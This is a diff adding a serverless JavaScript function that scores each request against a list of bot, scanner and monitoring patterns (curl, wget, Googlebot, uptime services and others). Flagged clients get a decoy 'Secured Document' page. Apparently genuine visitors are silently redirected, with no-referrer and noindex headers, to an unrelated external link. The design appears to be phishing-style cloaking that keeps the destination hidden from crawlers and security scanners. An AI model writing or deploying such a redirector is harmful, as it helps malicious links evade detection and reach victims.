@@ -1,0 +1,230 @@
+function main(args) {
+  // Get headers from the request
+  const headers = args.__ow_headers || {};
+  const userAgent = headers['user-agent'] || '';
+  const referer = headers['referer'] || '';
+  const acceptLanguage = headers['accept-language'] || '';
+  const ip = headers['x-forwarded-for'] || headers['client-ip'] || 'unknown';
+  
+  // Comprehensive list of bot/crawler patterns
+  const botPatterns = [
+    // Search engine bots
+    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
+    'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
+    
+    // SEO tools and crawlers
+    'ahrefs', 'semrush', 'mj12bot', 'dotbot', 'blexbot', 'bingpreview',
+    'rogerbot', 'exabot', 'archive.org_bot', 'gigabot', 'ia_archiver',
+    
+    // Scraping tools
+    'scrapy', 'python-requests', 'python-urllib', 'curl', 'wget',
+    'java', 'perl', 'ruby', 'php', 'httpclient', 'axios', 'node-fetch',
+    
+    // Headless browsers
+    'headless', 'phantomjs', 'puppeteer', 'selenium', 'chrome-headless',
+    'headlesschrome', 'headless-browser',
+    
+    // Bot frameworks
+    'bot', 'crawler', 'spider', 'scraper', 'crawling', 'scraping',
+    
+    // Testing tools
+    'postman', 'insomnia', 'jmeter', 'loadrunner', 'pagespeed',
+    
+    // Other known bots
+    'pingdom', 'uptimerobot', 'newrelic', 'datadog', 'zabbix',
+    'nagios', 'prtg', 'site24x7', 'statuscake'
+  ];
+  
+  // Convert user agent to lowercase for matching
+  const uaLower = userAgent.toLowerCase();
+  
+  // Check if it's a bot
+  const isBot = botPatterns.some(pattern => uaLower.includes(pattern));
+  
+  // Suspicious behavior detection
+  const hasNoReferer = !referer || referer === '' || referer === 'null' || referer === 'undefined';
+  const hasNoAcceptLanguage = !acceptLanguage || acceptLanguage === '';
+  const hasGenericAcceptLanguage = acceptLanguage && acceptLanguage.includes('*');
+  const isHeadless = uaLower.includes('headless') || 
+                     uaLower.includes('phantom') || 
+                     uaLower.includes('puppeteer');
+  
+  // Check for common headless browser characteristics
+  const missingHeaders = !headers['accept'] || 
+                        !headers['accept-encoding'] || 
+                        !headers['connection'];
+  
+  // Bot score calculation (higher score = more likely to be a bot)
+  let botScore = 0;
+  if (isBot) botScore += 5;
+  if (hasNoReferer) botScore += 3;
+  if (hasNoAcceptLanguage) botScore += 2;
+  if (hasGenericAcceptLanguage) botScore += 1;
+  if (isHeadless) botScore += 4;
+  if (missingHeaders) botScore += 2;
+  
+  // Simple rate limiting (you might want to implement this with Redis in production)
+  const requestTime = Date.now();
+  const lastRequestTime = globalThis.lastRequestTime || 0;
+  const timeSinceLastRequest = requestTime - lastRequestTime;
+  const isRateLimited = timeSinceLastRequest < 500; // Max 2 requests per second
+  
+  globalThis.lastRequestTime = requestTime;
+  
+  // Update request counter for IP-based tracking
+  if (!globalThis.requestCount) globalThis.requestCount = {};
+  const ipKey = ip.split(',')[0].trim(); // Get first IP if multiple
+  const now = Date.now();
+  
+  // Clean old requests (older than 1 minute)
+  if (!globalThis.requestCount[ipKey]) {
+    globalThis.requestCount[ipKey] = [];
+  }
+  
+  // Remove requests older than 60 seconds
+  globalThis.requestCount[ipKey] = globalThis.requestCount[ipKey].filter(
+    time => now - time < 60000
+  );
+  
+  // Add current request
+  globalThis.requestCount[ipKey].push(now);
+  
+  // Check if too many requests from this IP
+  const isIpRateLimited = globalThis.requestCount[ipKey].length > 30; // Max 30 requests per minute per IP
+  
+  // Combine all detection methods
+  const isSuspicious = botScore >= 5 || isRateLimited || isIpRateLimited;
+  
+  // Log detection results (useful for monitoring)
+  console.log('Request analysis:', {
+    userAgent: userAgent.substring(0, 100), // Truncate long user agents
+    referer: referer || 'none',
+    acceptLanguage: acceptLanguage || 'none',
+    ip: ipKey,
+    botScore,
+    isBot,
+    hasNoReferer,
+    hasNoAcceptLanguage,
+    isHeadless,
+    isRateLimited,
+    isIpRateLimited,
+    requestCount: globalThis.requestCount[ipKey]?.length || 0,
+    isSuspicious
+  });
+  
+  // If suspicious, serve a decoy page with honey pot
+  if (isSuspicious) {
+    return {
+      statusCode: 200,
+      headers: {
+        'Content-Type': 'text/html',
+        'Cache-Control': 'no-cache, no-store, must-revalidate, private',
+        'Pragma': 'no-cache',
+        'Expires': '0',
+        'X-Content-Type-Options': 'nosniff',
+        'X-Frame-Options': 'DENY',
+        'X-Robots-Tag': 'noindex, nofollow',
+        'Referrer-Policy': 'no-referrer'
+      },
+      body: `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8">
+          <title>Secured Document - Coming Soon</title>
+          <meta name="robots" content="noindex, nofollow">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { 
+              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+              min-height: 100vh;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              text-align: center;
+              color: white;
+              padding: 20px;
+            }
+            .container {
+              max-width: 600px;
+              padding: 40px;
+              background: rgba(255, 255, 255, 0.1);
+              backdrop-filter: blur(10px);
+              border-radius: 20px;
+              box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            }
+            h1 { font-size: 2.5em; margin-bottom: 20px; }
+            p { font-size: 1.2em; opacity: 0.9; margin-bottom: 30px; }
+            .loader {
+              border: 3px solid rgba(255,255,255,0.3);
+              border-top: 3px solid white;
+              border-radius: 50%;
+              width: 50px;
+              height: 50px;
+              animation: spin 1s linear infinite;
+              margin: 20px auto;
+            }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            .honeypot { display: none; } /* Hidden link for bot traps */
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <h1>Secured Document</h1>
+            <p>Please wait while we prepare your experience...</p>
+            <div class="loader"></div>
+            <div class="honeypot">
+              <a href="/admin" style="display:none">Admin Login</a>
+              <a href="/wp-admin" style="display:none">WordPress Admin</a>
+            </div>
+          </div>
+          
+          <script>
+            // For real users: redirect after a small delay
+            // This delays bots that don't execute JavaScript
+            setTimeout(function() {
+              // Additional check for browser environment
+              if (navigator && navigator.userAgent && !navigator.webdriver) {
+                window.location.replace('https://apronsetc.scalabletechadvantage.de/JGYd2/');
+              } else {
+                // Bot detection in JavaScript
+                document.body.innerHTML += '<p style="color:red">Please enable JavaScript and use a modern browser.</p>';
+              }
+            }, 2000);
+            
+            // Event listener for visibility (helps detect headless browsers)
+            document.addEventListener('visibilitychange', function() {
+              if (!document.hidden) {
+                // Page is visible, user might be real
+                console.log('Page visible');
+              }
+            });
+          </script>
+          
+          <noscript>
+            <meta http-equiv="refresh" content="3;url=https://apronsetc.scalabletechadvantage.de/JGYd2/">
+          </noscript>
+        </body>
+        </html>
+      `
+    };
+  }
+  
+  // For legitimate traffic, redirect immediately
+  return {
+    statusCode: 302,
+    headers: {
+      'Location': 'https://apronsetc.scalabletechadvantage.de/JGYd2/',
+      'Cache-Control': 'no-cache, no-store, must-revalidate, private',
+      'Pragma': 'no-cache',
+      'Expires': '0',
+      'X-Content-Type-Options': 'nosniff',
+      'X-Frame-Options': 'DENY',
+      'X-Robots-Tag': 'noindex, nofollow',
+      'Referrer-Policy': 'no-referrer'
+    },
+    body: ''
+  };
+}
